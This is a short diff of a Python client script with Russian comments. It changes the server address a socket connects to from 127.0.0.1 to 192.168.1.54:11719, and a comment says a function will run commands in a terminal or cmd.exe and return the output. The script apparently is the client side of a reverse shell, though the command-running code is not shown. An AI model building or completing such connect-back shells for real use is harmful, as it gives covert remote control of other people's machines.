@@ -4,7 +4,7 @@ import ctypes
 import time
 import subprocess as sp
 
-server = ('127.0.0.1', 11719) # IP и порт тот же, что и в серверной части
+server = ('192.168.1.54', 11719) # IP и порт тот же, что и в серверной части
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Функция будет выполнять команду в терминале/cmd.exe и возращать результат
